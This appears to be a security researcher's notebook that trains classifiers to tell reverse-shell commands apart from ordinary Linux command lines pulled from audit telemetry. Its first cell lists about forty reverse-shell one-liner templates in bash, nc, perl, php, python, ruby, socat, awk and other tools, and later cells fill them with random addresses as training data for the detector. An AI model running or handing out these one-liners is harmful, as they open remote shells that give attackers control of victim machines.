{
  "nbformat": 4,
  "nbformat_minor": 2,
  "cells": [
    {
      "cell_type": "code",
      "execution_count": 1,
      "outputs": [],
      "metadata": {
        "jupyter": {
          "source_hidden": false,
          "outputs_hidden": false
        },
        "nteract": {
          "transient": {
            "deleting": false
          }
        }
      },
      "source": [
        "REVERSE_SHELL_TEMPLATES = [\r\n",
        "        r\"NIX_SHELL -i >& /dev/PROTOCOL_TYPE/IP_ADDRESS/PORT_NUMBER 0>&1\",\r\n",
        "        r\"0<&FD_NUMBER;exec FD_NUMBER<>/dev/PROTOCOL_TYPE/IP_ADDRESS/PORT_NUMBER; NIX_SHELL <&FD_NUMBER >&FD_NUMBER 2>&FD_NUMBER\",\r\n",
        "        r\"exec FD_NUMBER<>/dev/PROTOCOL_TYPE/IP_ADDRESS/PORT_NUMBER;cat <&FD_NUMBER | while read VARIABLE_NAME; do $VARIABLE_NAME 2>&FD_NUMBER >&FD_NUMBER; done\",\r\n",
        "        r\"NIX_SHELL -i FD_NUMBER<> /dev/PROTOCOL_TYPE/IP_ADDRESS/PORT_NUMBER 0<&FD_NUMBER 1>&FD_NUMBER 2>&FD_NUMBER\",\r\n",
        "        r\"rm FILE_PATH;mkfifo FILE_PATH;cat FILE_PATH|NIX_SHELL -i 2>&1|nc IP_ADDRESS PORT_NUMBER >FILE_PATH\",\r\n",
        "        r\"rm FILE_PATH;mkfifo FILE_PATH;cat FILE_PATH|NIX_SHELL -i 2>&1|nc -u IP_ADDRESS PORT_NUMBER >FILE_PATH\",\r\n",
        "        r\"nc -e NIX_SHELL IP_ADDRESS PORT_NUMBER\",\r\n",
        "        r\"nc -eu NIX_SHELL IP_ADDRESS PORT_NUMBER\",\r\n",
        "        r\"nc -c NIX_SHELL IP_ADDRESS PORT_NUMBER\",\r\n",
        "        r\"nc -cu NIX_SHELL IP_ADDRESS PORT_NUMBER\",\r\n",
        "        r\"rcat IP_ADDRESS PORT_NUMBER -r NIX_SHELL\",\r\n",
        "        r\"\"\"perl -e 'use Socket;$VARIABLE_NAME_1=\"IP_ADDRESS\";$VARIABLE_NAME_2=PORT_NUMBER;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"PROTOCOL_TYPE\"));if(connect(S,sockaddr_in($VARIABLE_NAME_1,inet_aton($VARIABLE_NAME_2)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"NIX_SHELL -i\");};'\"\"\",\r\n",
        "        r\"\"\"perl -MIO -e '$VARIABLE_NAME_1=fork;exit,if($VARIABLE_NAME_1);$VARIABLE_NAME_2=new IO::Socket::INET(PeerAddr,\"IP_ADDRESS:PORT_NUMBER\");STDIN->fdopen($VARIABLE_NAME_2,r);$~->fdopen($VARIABLE_NAME_2,w);system$_ while<>;'\"\"\",\r\n",
        "        r\"\"\"php -r '$VARIABLE_NAME=fsockopen(\"IP_ADDRESS\",PORT_NUMBER);shell_exec(\"NIX_SHELL <&FD_NUMBER >&FD_NUMBER 2>&FD_NUMBER\");'\"\"\",\r\n",
        "        r\"\"\"php -r '$VARIABLE_NAME=fsockopen(\"IP_ADDRESS\",PORT_NUMBER);exec(\"NIX_SHELL <&FD_NUMBER >&FD_NUMBER 2>&FD_NUMBER\");'\"\"\",\r\n",
        "        r\"\"\"php -r '$VARIABLE_NAME=fsockopen(\"IP_ADDRESS\",PORT_NUMBER);system(\"NIX_SHELL <&FD_NUMBER >&FD_NUMBER 2>&FD_NUMBER\");'\"\"\",\r\n",
        "        r\"\"\"php -r '$VARIABLE_NAME=fsockopen(\"IP_ADDRESS\",PORT_NUMBER);passthru(\"NIX_SHELL <&FD_NUMBER >&FD_NUMBER 2>&FD_NUMBER\");'\"\"\",\r\n",
        "        r\"\"\"php -r '$VARIABLE_NAME=fsockopen(\"IP_ADDRESS\",PORT_NUMBER);popen(\"NIX_SHELL <&FD_NUMBER >&FD_NUMBER 2>&FD_NUMBER\", \"r\");'\"\"\",\r\n",
        "        r\"\"\"php -r '$VARIABLE_NAME=fsockopen(\"IP_ADDRESS\",PORT_NUMBER);`NIX_SHELL <&FD_NUMBER >&FD_NUMBER 2>&FD_NUMBER`;'\"\"\",\r\n",
        "        r\"\"\"php -r '$VARIABLE_NAME_1=fsockopen(\"IP_ADDRESS\",PORT_NUMBER);$VARIABLE_NAME_2=proc_open(\"NIX_SHELL\", array(0=>$VARIABLE_NAME_1, 1=>$VARIABLE_NAME_1, 2=>$VARIABLE_NAME_1),$VARIABLE_NAME_2);'\"\"\",\r\n",
        "        r\"\"\"export VARIABLE_NAME_1=\"IP_ADDRESS\";export VARIABLE_NAME_2=PORT_NUMBER;python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv(\"VARIABLE_NAME_1\"),int(os.getenv(\"VARIABLE_NAME_2\"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(\"NIX_SHELL\")'\"\"\",\r\n",
        "        r\"\"\"export VARIABLE_NAME_1=\"IP_ADDRESS\";export VARIABLE_NAME_2=PORT_NUMBER;python3 -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv(\"VARIABLE_NAME_1\"),int(os.getenv(\"VARIABLE_NAME_2\"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(\"sh\")'\"\"\"\r\n",
        "        r\"\"\"python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"IP_ADDRESS\",PORT_NUMBER));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\"NIX_SHELL\")'\"\"\",\r\n",
        "        r\"\"\"python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"IP_ADDRESS\",PORT_NUMBER));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\"NIX_SHELL\")'\"\"\",\r\n",
        "        r\"\"\"python3 -c 'import os,pty,socket;s=socket.socket();s.connect((\"IP_ADDRESS\",PORT_NUMBER));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn(\"NIX_SHELL\")'\"\"\",\r\n",
        "        r\"\"\"ruby -rsocket -e'spawn(\"NIX_SHELL\",[:in,:out,:err]=>TCPSocket.new(\"IP_ADDRESS\",PORT_NUMBER))'\"\"\",\r\n",
        "        r\"\"\"ruby -rsocket -e'spawn(\"NIX_SHELL\",[:in,:out,:err]=>TCPSocket.new(\"IP_ADDRESS\",\"PORT_NUMBER\"))'\"\"\",\r\n",
        "        r\"\"\"ruby -rsocket -e'exit if fork;c=TCPSocket.new(\"IP_ADDRESS\",PORT_NUMBER);loop{c.gets.chomp!;(exit! if $_==\"exit\");($_=~/cd (.+)/i?(Dir.chdir($1)):(IO.popen($_,?r){|io|c.print io.read}))rescue c.puts \"failed: #{$_}\"}'\"\"\",\r\n",
        "        r\"\"\"ruby -rsocket -e'exit if fork;c=TCPSocket.new(\"IP_ADDRESS\",\"PORT_NUMBER\");loop{c.gets.chomp!;(exit! if $_==\"exit\");($_=~/cd (.+)/i?(Dir.chdir($1)):(IO.popen($_,?r){|io|c.print io.read}))rescue c.puts \"failed: #{$_}\"}'\"\"\",\r\n",
        "        r\"\"\"socat PROTOCOL_TYPE:IP_ADDRESS:PORT_NUMBER EXEC:NIX_SHELL\"\"\"\r\n",
        "        r\"\"\"socat PROTOCOL_TYPE:IP_ADDRESS:PORT_NUMBER EXEC:'NIX_SHELL',pty,stderr,setsid,sigint,sane\"\"\",\r\n",
        "        r\"\"\"VARIABLE_NAME=$(mktemp -u);mkfifo $VARIABLE_NAME && telnet IP_ADDRESS PORT_NUMBER 0<$VARIABLE_NAME | NIX_SHELL 1>$VARIABLE_NAME\"\"\",\r\n",
        "        r\"\"\"zsh -c 'zmodload zsh/net/tcp && ztcp IP_ADDRESS PORT_NUMBER && zsh >&$REPLY 2>&$REPLY 0>&$REPLY'\"\"\",\r\n",
        "        r\"\"\"lua -e \"require('socket');require('os');t=socket.PROTOCOL_TYPE();t:connect('IP_ADDRESS','PORT_NUMBER');os.execute('NIX_SHELL -i <&FD_NUMBER >&FD_NUMBER 2>&FD_NUMBER');\"\"\",\r\n",
        "        r\"\"\"lua5.1 -e 'local VARIABLE_NAME_1, VARIABLE_NAME_2 = \"IP_ADDRESS\", PORT_NUMBER local socket = require(\"socket\") local tcp = socket.tcp() local io = require(\"io\") tcp:connect(VARIABLE_NAME_1, VARIABLE_NAME_2); while true do local cmd, status, partial = tcp:receive() local f = io.popen(cmd, \"r\") local s = f:read(\"*a\") f:close() tcp:send(s) if status == \"closed\" then break end end tcp:close()'\"\"\",\r\n",
        "        r\"\"\"echo 'import os' > FILE_PATH.v && echo 'fn main() { os.system(\"nc -e NIX_SHELL IP_ADDRESS PORT_NUMBER 0>&1\") }' >> FILE_PATH.v && v run FILE_PATH.v && rm FILE_PATH.v\"\"\",\r\n",
        "        r\"\"\"awk 'BEGIN {VARIABLE_NAME_1 = \"/inet/PROTOCOL_TYPE/0/IP_ADDRESS/PORT_NUMBER\"; while(FD_NUMBER) { do{ printf \"shell>\" |& VARIABLE_NAME_1; VARIABLE_NAME_1 |& getline VARIABLE_NAME_2; if(VARIABLE_NAME_2){ while ((VARIABLE_NAME_2 |& getline) > 0) print $0 |& VARIABLE_NAME_1; close(VARIABLE_NAME_2); } } while(VARIABLE_NAME_2 != \"exit\") close(VARIABLE_NAME_1); }}' /dev/null\"\"\"\r\n",
        "    ]"
      ]
    },
    {
      "cell_type": "code",
      "execution_count": 2,
      "outputs": [],
      "metadata": {
        "jupyter": {
          "source_hidden": false,
          "outputs_hidden": false
        },
        "nteract": {
          "transient": {
            "deleting": false
          }
        }
      },
      "source": [
        "import random\r\n",
        "import string\r\n",
        "import time\r\n",
        "\r\n",
        "# ===================\r\n",
        "# HELPER FUNCTIONS\r\n",
        "def get_random_ip(octets=4):\r\n",
        "    return \".\".join(map(str, (random.randint(0, 255) for _ in range(octets))))\r\n",
        "\r\n",
        "def get_random_string(length=10):\r\n",
        "    return \"\".join(random.choice(string.ascii_lowercase + string.digits) for _ in range(length))\r\n",
        "\r\n",
        "def get_random_filepaths(count=1):\r\n",
        "    path_roots = [\"/tmp/\", \"/home/user/\", \"/var/www/\"]\r\n",
        "    folder_lenths = [1, 8]\r\n",
        "    random_paths = []\r\n",
        "    for _ in range(count):\r\n",
        "        random_paths.append(random.choice(path_roots) + get_random_string(random.choice(folder_lenths)))\r\n",
        "    return random_paths\r\n",
        "\r\n",
        "# Define function for command generation\r\n",
        "def generate_commands(templates, placeholder_sampling_functions, number_of_examples_per_template):\r\n",
        "    DATASET = []\r\n",
        "\r\n",
        "    for cmd in templates:\r\n",
        "        for _ in range(number_of_examples_per_template):\r\n",
        "            new_cmd = cmd\r\n",
        "            for placeholder, sampling_func in placeholder_sampling_functions.items():\r\n",
        "                if placeholder in new_cmd:\r\n",
        "                    new_cmd = new_cmd.replace(placeholder, str(sampling_func()))\r\n",
        "            DATASET.append(new_cmd)\r\n",
        "\r\n",
        "    print(f\"[!] Generated total {len(DATASET)} commands.\")\r\n",
        "    return DATASET\r\n",
        "\r\n",
        "# ===================\r\n",
        "# CONFIG\r\n",
        "\r\n",
        "NIX_SHELLS = [\"sh\", \"bash\", \"dash\"] #\"tcsh\", \"zsh\", \"ksh\", \"pdksh\", \"ash\", \"bsh\", \"csh\"]\r\n",
        "NIX_SHELL_FOLDERS = [\"/bin/\", \"/usr/bin/\"] #, \"/usr/local/bin/\"]\r\n",
        "FULL_SHELL_LIST = []\r\n",
        "for shell in NIX_SHELLS:\r\n",
        "    shell_fullpaths = [x+shell for x in NIX_SHELL_FOLDERS]\r\n",
        "    FULL_SHELL_LIST.extend(shell_fullpaths + [shell])\r\n",
        "\r\n",
        "ENTRY_COUNT_PER_TEMPLATE = 5\r\n",
        "\r\n",
        "NR_OF_RANDOM_VALUES = 5\r\n",
        "SEED = 0\r\n",
        "random.seed(SEED)\r\n",
        "\r\n",
        "placeholder_sampling_functions = {\r\n",
        "    'NIX_SHELL': lambda: random.choice(FULL_SHELL_LIST),\r\n",
        "    'PROTOCOL_TYPE': lambda: random.choice([\"tcp\", \"udp\"]),\r\n",
        "    'FD_NUMBER': lambda: 3,\r\n",
        "    'FILE_PATH': lambda: random.choice([\"/tmp/f\", \"/tmp/t\"] + get_random_filepaths(count=NR_OF_RANDOM_VALUES)),\r\n",
        "    'VARIABLE_NAME': lambda: random.choice([\"port\", \"host\", \"cmd\", \"p\", \"s\", \"c\", ] + [get_random_string(length=4) for _ in range(NR_OF_RANDOM_VALUES)]),\r\n",
        "    'IP_ADDRESS': lambda: random.choice([\"127.0.0.1\"] + [\"10.\"+get_random_ip(octets=3) for _ in range(NR_OF_RANDOM_VALUES)]),\r\n",
        "    'PORT_NUMBER': lambda: random.choice([8080, 9001, 80, 443, 53, 22, 8000, 8888] + [int(random.uniform(0,65535)) for _ in range(NR_OF_RANDOM_VALUES)]),\r\n",
        "}\r\n",
        "dataset = generate_commands(\r\n",
        "    templates=REVERSE_SHELL_TEMPLATES,\r\n",
        "    placeholder_sampling_functions=placeholder_sampling_functions,\r\n",
        "    number_of_examples_per_template=ENTRY_COUNT_PER_TEMPLATE\r\n",
        ")"
      ]
    },
    {
      "cell_type": "code",
      "execution_count": 3,
      "outputs": [],
      "metadata": {
        "jupyter": {
          "source_hidden": false,
          "outputs_hidden": false
        },
        "nteract": {
          "transient": {
            "deleting": false
          }
        }
      },
      "source": [
        "for i in range(5):\r\n",
        "    print(random.choice(dataset))"
      ]
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "nteract": {
          "transient": {
            "deleting": false
          }
        }
      },
      "source": [
        "## TODO\r\n",
        "\r\n",
        "1. train_test_split templates\r\n",
        "2. get train / test data from Linux telemetry:\r\n",
        "\r\n",
        "- 3d-1d -- training data | 1d-now -- test data\r\n",
        "- unique commandlines\r\n",
        "- generate the same amount of malicious examples\r\n",
        "\r\n",
        "3. train classifiers and compare:\r\n",
        "\r\n",
        "- TF-IDF\r\n",
        "- 1D-conv"
      ]
    },
    {
      "cell_type": "code",
      "execution_count": 4,
      "outputs": [],
      "metadata": {
        "jupyter": {
          "source_hidden": false,
          "outputs_hidden": false
        },
        "nteract": {
          "transient": {
            "deleting": false
          }
        }
      },
      "source": [
        "from sklearn.metrics import auc, confusion_matrix\r\n",
        "import matplotlib.pyplot as plt\r\n",
        "import seaborn as sns\r\n",
        "\r\n",
        "\r\n",
        "def plot_roc_curve(fpr, tpr, tpr_std=None, model_name=\"\", ax=None, xlim=[-0.0005, 0.003], ylim=[0.3, 1.0], roc_auc=None, linestyle=\"-\", color=None, semilogx=False):\r\n",
        "    if ax is None:\r\n",
        "        fig, ax = plt.subplots(1, 1, figsize=(10, 6))\r\n",
        "    if roc_auc:\r\n",
        "        label = f\"{model_name} (AUC = {roc_auc:.6f})\"\r\n",
        "    else:\r\n",
        "        label = model_name\r\n",
        "    if semilogx:\r\n",
        "        ax.semilogx(fpr, tpr, lw=2, label=label, linestyle=linestyle, color=color)\r\n",
        "    else:\r\n",
        "        ax.plot(fpr, tpr, lw=2, label=label, linestyle=linestyle, color=color)\r\n",
        "    if tpr_std is not None:\r\n",
        "        tprs_upper = np.minimum(tpr + tpr_std, 1)\r\n",
        "        tprs_lower = tpr - tpr_std\r\n",
        "        color = ax.lines[-1].get_color()\r\n",
        "        color = color[:-2] + \"33\"\r\n",
        "        ax.fill_between(fpr, tprs_lower, tprs_upper, alpha=.2, color=color)\r\n",
        "    ax.set_xlim(xlim)\r\n",
        "    ax.set_ylim(ylim)\r\n",
        "    return ax\r\n",
        "\r\n",
        "\r\n",
        "def plot_confusion_matrix(y_true, y_pred, ax=None):\r\n",
        "    # Compute confusion matrix\r\n",
        "    cm = confusion_matrix(y_true, y_pred)\r\n",
        "    # Compute normalized confusion matrix\r\n",
        "    cm_norm = confusion_matrix(y_true, y_pred, normalize='true')\r\n",
        "    \r\n",
        "    # Create a DataFrame for easier visualization\r\n",
        "    cm_df = pd.DataFrame(cm, \r\n",
        "                         index = np.unique(y_true), \r\n",
        "                         columns = np.unique(y_true))\r\n",
        "    \r\n",
        "    # Normalize confusion matrix\r\n",
        "    cm_df_norm = pd.DataFrame(cm_norm, \r\n",
        "                              index = np.unique(y_true), \r\n",
        "                              columns = np.unique(y_true))\r\n",
        "\r\n",
        "    # Format the numbers as a percentage and append absolute numbers\r\n",
        "    labels = (np.asarray([\"{1:d}\\n{0:0.2f}%\".format(norm, abs) \r\n",
        "                          for norm, abs in zip(cm_norm.flatten(), cm.flatten())])\r\n",
        "             ).reshape(cm.shape[0],cm.shape[1])\r\n",
        "\r\n",
        "    if ax is None:\r\n",
        "        fig, ax = plt.subplots(figsize=(10, 8))\r\n",
        "    sns.heatmap(cm_df, annot=labels, fmt='', cmap='Blues', ax=ax)\r\n",
        "    ax.set_title('Confusion matrix')\r\n",
        "    ax.set_ylabel('Actual label')\r\n",
        "    ax.set_xlabel('Predicted label')\r\n",
        "    return ax\r\n",
        "\r\n",
        ""
      ]
    },
    {
      "cell_type": "code",
      "execution_count": 5,
      "outputs": [],
      "metadata": {
        "jupyter": {
          "source_hidden": false,
          "outputs_hidden": false
        },
        "nteract": {
          "transient": {
            "deleting": false
          }
        }
      },
      "source": [
        "import pandas as pd\r\n",
        "import time\r\n",
        "\r\n",
        "def get_auditd_commands(time_window_start: str = \"2h\", time_window_end: str = \"1h\", pattern: str = None, query: str = None) -> pd.DataFrame:\r\n",
        "    assert pattern or query, \"Either pattern or query should be provided\"    \r\n",
        "    \r\n",
        "    time_window_start = time_window_start if time_window_start.startswith(\"-\") else \"-\" + time_window_start\r\n",
        "    time_window_end = time_window_end if time_window_end.startswith(\"-\") else \"-\" + time_window_end\r\n",
        "\r\n",
        "    if query is not None:\r\n",
        "        kqlQuery = query\r\n",
        "    else:\r\n",
        "        kqlQuery = f\"\"\"\r\n",
        "cluster(\"m365secdata.kusto.windows.net\").database(\"m365_long_term_retention_linux\").LinuxEventsLongTermRetention\r\n",
        "| where DateTimeUtc between(now({time_window_start}) .. now({time_window_end}))\r\n",
        "| where Source == \"auditbeat\"\r\n",
        "| where EventId == \"execution\"\r\n",
        "| extend cmd = tostring(EventData.[\"process.args\"])\r\n",
        "| where {pattern}\r\n",
        "| distinct cmd\r\n",
        "\"\"\"\r\n",
        "    \r\n",
        "    linkedService_LTR_Azure = \"ADE_M365SecData_LongTermRetention_Azure\"\r\n",
        "    ltr_db = \"m365_long_term_retention_azure\"\r\n",
        "    \r\n",
        "    print(\"[!] Executing query:\\n\", kqlQuery)\r\n",
        "\r\n",
        "    detections_sdf  = spark.read \\\r\n",
        "                .format(\"com.microsoft.kusto.spark.synapse.datasource\") \\\r\n",
        "                .option(\"spark.synapse.linkedService\", linkedService_LTR_Azure) \\\r\n",
        "                .option(\"kustoDatabase\", ltr_db) \\\r\n",
        "                .option(\"kustoQuery\", kqlQuery) \\\r\n",
        "                .load()\r\n",
        "    return detections_sdf.toPandas()\r\n",
        "\r\n",
        "now = time.time()\r\n",
        "train_baseline_df = get_auditd_commands(time_window_start=\"6h\", time_window_end=\"4h\", pattern=\"\"\" cmd contains \"sh\" | limit 10000 \"\"\")\r\n",
        "test_baseline_df = get_auditd_commands(time_window_start=\"4h\", time_window_end=\"2h\", pattern=\"\"\" cmd contains \"sh\" | limit 10000 \"\"\")\r\n",
        "print(f\"[!] Queries took {int(time.time()) - now:.2f}s\")"
      ]
    },
    {
      "cell_type": "code",
      "execution_count": 6,
      "outputs": [],
      "metadata": {
        "jupyter": {
          "source_hidden": false,
          "outputs_hidden": false
        },
        "nteract": {
          "transient": {
            "deleting": false
          }
        }
      },
      "source": [
        "from sklearn.model_selection import train_test_split\r\n",
        "\r\n",
        "SEED = 33\r\n",
        "random.seed(SEED)\r\n",
        "train_templates, test_templates = train_test_split(REVERSE_SHELL_TEMPLATES, test_size=0.3, random_state=SEED)\r\n",
        "\r\n",
        "NR_OF_RANDOM_VALUES = 5\r\n",
        "placeholder_sampling_functions = {\r\n",
        "    'NIX_SHELL': lambda: random.choice(FULL_SHELL_LIST),\r\n",
        "    'PROTOCOL_TYPE': lambda: random.choice([\"tcp\", \"udp\"]),\r\n",
        "    'FD_NUMBER': lambda: 3,\r\n",
        "    'FILE_PATH': lambda: random.choice([\"/tmp/f\", \"/tmp/t\"] + get_random_filepaths(count=NR_OF_RANDOM_VALUES)),\r\n",
        "    'VARIABLE_NAME': lambda: random.choice([\"port\", \"host\", \"cmd\", \"p\", \"s\", \"c\", ] + [get_random_string(length=4) for _ in range(NR_OF_RANDOM_VALUES)]),\r\n",
        "    'IP_ADDRESS': lambda: random.choice([\"127.0.0.1\"] + [\"10.\"+get_random_ip(octets=3) for _ in range(NR_OF_RANDOM_VALUES)]),\r\n",
        "    'PORT_NUMBER': lambda: random.choice([8080, 9001, 80, 443, 53, 22, 8000, 8888] + [int(random.uniform(0,65535)) for _ in range(NR_OF_RANDOM_VALUES)]),\r\n",
        "}\r\n",
        "\r\n",
        "train_entry_count_per_template = len(train_baseline_df) // len(train_templates)\r\n",
        "train_malicious_commands = generate_commands(\r\n",
        "    templates=train_templates,\r\n",
        "    placeholder_sampling_functions=placeholder_sampling_functions,\r\n",
        "    number_of_examples_per_template=train_entry_count_per_template\r\n",
        ")\r\n",
        "\r\n",
        "test_entry_count_per_template = len(test_baseline_df) // len(test_templates)\r\n",
        "test_malicious_commands = generate_commands(\r\n",
        "    templates=test_templates,\r\n",
        "    placeholder_sampling_functions=placeholder_sampling_functions,\r\n",
        "    number_of_examples_per_template=test_entry_count_per_template\r\n",
        ")"
      ]
    },
    {
      "cell_type": "code",
      "execution_count": 7,
      "outputs": [],
      "metadata": {
        "jupyter": {
          "source_hidden": false,
          "outputs_hidden": false
        },
        "nteract": {
          "transient": {
            "deleting": false
          }
        }
      },
      "source": [
        "print(f\"[!] Train baseline commands: {len(train_baseline_df)} | Test baseline commands: {len(test_baseline_df)}\")\r\n",
        "print(f\"[!] Train malicious commands: {len(train_malicious_commands)} | Test malicious commands: {len(test_malicious_commands)}\")"
      ]
    },
    {
      "cell_type": "code",
      "execution_count": 8,
      "outputs": [],
      "metadata": {
        "jupyter": {
          "source_hidden": false,
          "outputs_hidden": false
        },
        "nteract": {
          "transient": {
            "deleting": false
          }
        }
      },
      "source": [
        "import numpy as np\r\n",
        "from nltk.tokenize import wordpunct_tokenize\r\n",
        "from sklearn.feature_extraction.text import TfidfVectorizer, HashingVectorizer\r\n",
        "from sklearn.utils import shuffle\r\n",
        "from sklearn.metrics import classification_report\r\n",
        "from sklearn.metrics import roc_curve\r\n",
        "\r\n",
        "from sklearn.ensemble import RandomForestClassifier\r\n",
        "from xgboost import XGBClassifier\r\n",
        "\r\n",
        "def fit_and_evaluate(model, vectorizer, key, X_train, y_train, X_test, y_test):\r\n",
        "    # fit the vectorizer to the training data\r\n",
        "    vectorizer.fit(X_train)\r\n",
        "\r\n",
        "    # transform the training data\r\n",
        "    X_train_enc = vectorizer.transform(X_train)\r\n",
        "\r\n",
        "    # fit the classifier to the training data\r\n",
        "    model.fit(X_train_enc, y_train)\r\n",
        "\r\n",
        "    # transform the test data\r\n",
        "    X_test_enc = vectorizer.transform(X_test)\r\n",
        "\r\n",
        "    # predict on the test set\r\n",
        "    y_test_pred = model.predict(X_test_enc)\r\n",
        "    \r\n",
        "    # print the classification report\r\n",
        "    print(key + \":\\n\" , classification_report(y_test, y_test_pred, target_names=['baseline', 'malicious']))\r\n",
        "\r\n",
        "    # compute false positive rate and true positive rate\r\n",
        "    fpr, tpr, _ = roc_curve(y_test, y_test_pred)\r\n",
        "\r\n",
        "    return y_test_pred, fpr, tpr\r\n",
        "\r\n",
        "X_train_raw = train_baseline_df['cmd'].values.tolist() + train_malicious_commands\r\n",
        "y_train = np.array([0] * len(train_baseline_df) + [1] * len(train_malicious_commands), dtype=np.int8)\r\n",
        "X_train, y_train = shuffle(X_train_raw, y_train, random_state=SEED)\r\n",
        "\r\n",
        "X_test_raw = test_baseline_df['cmd'].values.tolist() + test_malicious_commands\r\n",
        "y_test = np.array([0] * len(test_baseline_df) + [1] * len(test_malicious_commands), dtype=np.int8)\r\n",
        "X_test, y_test = shuffle(X_test_raw, y_test, random_state=SEED)\r\n",
        "\r\n",
        "keys = [\r\n",
        "    \"TF-IDF & RF\",\r\n",
        "    \"TF-IDF & GBDT\",\r\n",
        "    \"Hash & RF\",\r\n",
        "    \"Hash & GBDT\"\r\n",
        "]\r\n",
        "\r\n",
        "# List of vectorizers\r\n",
        "vectorizers = [\r\n",
        "    TfidfVectorizer(tokenizer=wordpunct_tokenize, stop_words=None, token_pattern=None),\r\n",
        "    TfidfVectorizer(tokenizer=wordpunct_tokenize, stop_words=None, token_pattern=None),\r\n",
        "    HashingVectorizer(tokenizer=wordpunct_tokenize, stop_words=None, token_pattern=None),\r\n",
        "    HashingVectorizer(tokenizer=wordpunct_tokenize, stop_words=None, token_pattern=None)\r\n",
        "]\r\n",
        "\r\n",
        "# List of models\r\n",
        "N_ESTIMATORS = 5\r\n",
        "MAX_DEPTH = 5\r\n",
        "models = [\r\n",
        "    RandomForestClassifier(n_estimators=N_ESTIMATORS, max_depth=MAX_DEPTH, random_state=SEED),\r\n",
        "    XGBClassifier(n_estimators=N_ESTIMATORS, max_depth=MAX_DEPTH, random_state=SEED, eval_metric='logloss', use_label_encoder=False),\r\n",
        "    RandomForestClassifier(n_estimators=N_ESTIMATORS, max_depth=10, random_state=SEED),\r\n",
        "    XGBClassifier(n_estimators=N_ESTIMATORS, max_depth=10, random_state=SEED, eval_metric='logloss', use_label_encoder=False)\r\n",
        "]\r\n",
        "\r\n",
        "y_preds, fprs, tprs = {}, {}, {}\r\n",
        "\r\n",
        "for key, vectorizer, model in zip(keys, vectorizers, models):\r\n",
        "    y_preds[key], fprs[key], tprs[key] = fit_and_evaluate(model, vectorizer, key, X_train, y_train, X_test, y_test)\r\n",
        ""
      ]
    },
    {
      "cell_type": "code",
      "execution_count": 9,
      "outputs": [],
      "metadata": {
        "jupyter": {
          "source_hidden": false,
          "outputs_hidden": false
        },
        "nteract": {
          "transient": {
            "deleting": false
          }
        }
      },
      "source": [
        "from sklearn.metrics import auc, confusion_matrix\r\n",
        "import matplotlib.pyplot as plt\r\n",
        "import seaborn as sns\r\n",
        "\r\n",
        "for key in list(fprs.keys())[:2]:\r\n",
        "    fig, ax = plt.subplots(1, 2, figsize=(14, 5))\r\n",
        "    plot_roc_curve(fprs[key], tprs[key], roc_auc=auc(fprs[key], tprs[key]), xlim=None, ylim=None, ax=ax[0]) \r\n",
        "    plot_confusion_matrix(y_test, y_preds[key], ax=ax[1])\r\n",
        "    fig.suptitle(key, fontsize=16)"
      ]
    },
    {
      "cell_type": "code",
      "execution_count": 10,
      "outputs": [],
      "metadata": {
        "jupyter": {
          "source_hidden": false,
          "outputs_hidden": false
        },
        "nteract": {
          "transient": {
            "deleting": false
          }
        }
      },
      "source": [
        "for key in list(fprs.keys())[2:]:\r\n",
        "    fig, ax = plt.subplots(1, 2, figsize=(14, 5))\r\n",
        "    plot_roc_curve(fprs[key], tprs[key], roc_auc=auc(fprs[key], tprs[key]), xlim=None, ylim=None, ax=ax[0]) \r\n",
        "    plot_confusion_matrix(y_test, y_preds[key], ax=ax[1])\r\n",
        "    fig.suptitle(key, fontsize=16)"
      ]
    }
  ],
  "metadata": {
    "description": null,
    "save_output": true,
    "kernelspec": {
      "name": "synapse_pyspark",
      "display_name": "Synapse PySpark"
    },
    "language_info": {
      "name": "python"
    }
  }
}